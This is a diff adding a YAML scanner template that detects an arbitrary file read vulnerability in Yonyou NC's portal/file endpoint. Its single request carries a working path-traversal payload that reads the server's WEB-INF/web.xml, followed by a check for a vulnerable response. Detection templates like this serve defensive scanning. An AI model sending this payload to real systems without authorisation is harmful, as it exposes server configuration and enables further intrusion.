@@ -1,0 +1,18 @@
+id: yonyou-nc-portalfile-fileread
+
+info:
+  name: 用友NC portal/file 任意文件读取漏洞
+  author: Wen
+  severity: high
+  reference:
+    - https://mp.weixin.qq.com/s/dA1R1uWYLl3YD9hGxPts2w
+  tags: yonyou,nc,fileread
+  created: 2024/01/22
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml
+    expression: response.status == 200 && response.body.bcontains(b"<web-app") && response.body.bcontains(b"nc.bs.framework.server.WebApplicationStartupHook")
+expression: r0()
